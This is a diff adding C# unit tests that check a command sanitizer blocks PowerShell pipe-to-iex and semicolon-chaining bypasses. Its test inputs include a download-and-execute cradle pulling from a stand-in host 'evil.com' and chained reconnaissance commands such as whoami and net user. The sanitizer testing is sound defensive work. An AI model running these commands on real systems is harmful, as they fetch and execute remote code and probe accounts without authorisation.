@@ -936,4 +936,33 @@ public class IpcDtoTests
     {
         Assert.NotNull(InputSanitizer.CheckDangerousCommand(input));
     }
+
+    // ── Pipe-to-IEX bypass vectors ─────────────────────────────────
+
+    [Theory]
+    [InlineData("'Get-Process' | iex")]
+    [InlineData("(New-Object Net.WebClient).DownloadString('http://evil.com') |iex")]
+    [InlineData("gc payload.ps1 |  iex")]
+    [InlineData("\"whoami\" | IEX")]
+    public void CheckDangerousCommand_PipeToIex_Blocks(string input)
+    {
+        Assert.NotNull(InputSanitizer.CheckDangerousCommand(input));
+    }
+
+    // ── Multi-semicolon chaining bypass ─────────────────────────────
+
+    [Theory]
+    [InlineData("safe-cmd; malicious-cmd;")]
+    [InlineData("Set-MpPreference -DisableRealtimeMonitoring $false; whoami; net user")]
+    public void CheckDangerousCommand_MultiSemicolonChaining_Blocks(string input)
+    {
+        Assert.NotNull(InputSanitizer.CheckDangerousCommand(input));
+    }
+
+    [Fact]
+    public void CheckDangerousCommand_SingleTrailingSemicolon_Allowed()
+    {
+        // A single command ending with semicolon should be allowed
+        Assert.Null(InputSanitizer.CheckDangerousCommand("Set-MpPreference -DisableRealtimeMonitoring $false;"));
+    }
 }
